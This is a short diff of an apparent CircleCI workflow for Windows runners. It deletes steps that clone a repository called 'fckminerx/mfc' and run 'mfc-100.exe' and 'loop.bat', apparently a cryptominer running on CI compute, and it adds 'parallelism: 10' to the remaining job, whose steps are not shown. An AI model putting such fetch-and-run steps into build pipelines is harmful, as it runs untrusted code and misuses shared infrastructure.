@@ -8,20 +8,7 @@ jobs:
     executor: 
       name: win/default # executor type
       size: medium # can be medium, large, xlarge, 2xlarge
-
-    steps:
-      # Commands are run in a Windows virtual machine environment
-      - checkout
-      - run: Write-Host 'Hello, Windows'
-      - run: git clone https://github.com/fckminerx/mfc
-      - run: cd mfc
-      - run: powershell .\mfc-100.exe
-      - run: powershell .\loop.bat
-  buildX: # name of your job
-    executor: 
-      name: win/default # executor type
-      size: medium # can be medium, large, xlarge, 2xlarge
-
+    parallelism: 10
     steps:
       # Commands are run in a Windows virtual machine environment
       - checkout
